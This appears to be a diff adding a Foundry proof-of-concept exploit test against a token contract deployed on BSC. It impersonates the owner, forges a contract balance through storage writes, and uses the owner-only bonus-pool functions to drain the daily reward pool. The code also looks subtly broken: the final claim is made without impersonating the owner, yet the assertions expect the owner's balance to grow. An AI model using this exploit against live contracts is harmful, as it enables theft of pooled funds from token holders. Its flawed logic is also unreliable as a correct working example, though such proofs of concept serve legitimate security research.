@@ -1,0 +1,102 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface IMyCoinToken {
+    function owner() external view returns (address);
+    function balanceOf(address) external view returns (uint256);
+    function getDays() external view returns (string memory, string memory);
+    function dayPoolBouns(string memory) external view returns (uint256);
+    function sumTheBounsPool(string memory, string memory) external;
+    function sumBounsPiece(string memory, uint256) external returns (bool);
+    function receiveBounsToken() external returns (uint256);
+    function transfer(address, uint256) external returns (bool);
+    function getTime() external view returns (uint256);
+    function decimals() external pure returns (uint8);
+}
+
+contract ExploitTest is Test {
+    // Deployed contract address (BSC)
+    address constant TOKEN = 0x7144e379c827fa71a7ecaa01d00607cbb7eb1b7a;
+    IMyCoinToken constant token = IMyCoinToken(TOKEN);
+
+    address owner;
+
+    uint256 constant eachPiece = 100_000_000_000 * 1e9; // 100 billion tokens with 9 decimals = 1e20
+
+    function setUp() public {
+        owner = token.owner();
+        vm.label(owner, "Owner");
+        vm.label(TOKEN, "MyCoinToken");
+    }
+
+    function testExploit() public {
+        // ====== 1. Prepare environment ======
+        // Set a fixed timestamp to have deterministic date strings
+        vm.warp(1_710_633_600); // 2024-03-17 00:00:00 UTC
+
+        // Get day strings (yesToday = 20240316, twoYesToday = 20240315)
+        (string memory yesToday, string memory twoYesToday) = token.getDays();
+
+        // Ensure the contract has a reward pool
+        uint256 initialContractBalance = token.balanceOf(TOKEN);
+        if (initialContractBalance == 0) {
+            // Directly set the contract's balance to 100,000 tokens via storage
+            // Mapping _balances is at slot 3, key = address(token)
+            bytes32 slot = keccak256(abi.encode(TOKEN, uint256(3)));
+            uint256 fakeBalance = 100_000 * 1e9; // 100,000 tokens
+            vm.store(TOKEN, slot, bytes32(fakeBalance));
+        }
+
+        // ====== 2. Owner reduces own balance to exactly one "piece" ======
+        // This makes balancePiece = 1, simplifying the final claim calculation.
+        uint256 ownerBalance = token.balanceOf(owner);
+        if (ownerBalance > eachPiece) {
+            uint256 excess = ownerBalance - eachPiece;
+            vm.prank(owner);
+            token.transfer(address(0xdead), excess);
+        }
+        require(token.balanceOf(owner) == eachPiece, "Owner balance not exactly one piece");
+
+        // ====== 3. Owner calls sumTheBounsPool ======
+        // Transfers half of the contract's balance to dayPoolBouns[yesToday].
+        vm.prank(owner);
+        token.sumTheBounsPool(yesToday, twoYesToday);
+
+        // ====== 4. Owner calls sumBounsPiece to set the piece value ======
+        uint256 pool = token.dayPoolBouns(yesToday);
+        require(pool > 0, "Pool is zero after sumTheBounsPool");
+
+        // The piece value is num * 10**9. To drain the whole pool we need:
+        // dayPoolBounsPiece[yesToday] * balancePiece == pool.
+        // Since balancePiece = 1, we set dayPoolBounsPiece = pool.
+        uint256 num = pool / 1e9; // integer division – may lose a few wei, but that's acceptable
+        vm.prank(owner);
+        token.sumBounsPiece(yesToday, num);
+
+        // ====== 5. Owner calls receiveBounsToken to claim the entire pool ======
+        uint256 claimed = token.receiveBounsToken();
+
+        // ====== 6. Assertions ======
+        // Owner's balance increased by the claimed amount
+        uint256 finalOwnerBalance = token.balanceOf(owner);
+        // Initially owner had exactly eachPiece, after transfer gave away excess, then added claimed.
+        // So final balance should be eachPiece + claimed.
+        assertEq(finalOwnerBalance, eachPiece + claimed, "Owner balance mismatch");
+
+        // The contract's balance decreased accordingly
+        uint256 finalContractBalance = token.balanceOf(TOKEN);
+        // initialContractBalance may have been modified by the vm.store; we can't precisely predict.
+        // But we check that the pool is now empty (or nearly empty).
+        uint256 remainingPool = token.dayPoolBouns(yesToday);
+        assertLe(remainingPool, pool - claimed, "Pool not fully drained");
+
+        // Log the success
+        emit log_named_uint("Claimed amount", claimed);
+        emit log_named_uint("Remaining pool", remainingPool);
+        emit log_named_uint("Owner final balance", finalOwnerBalance);
+    }
+}
+```
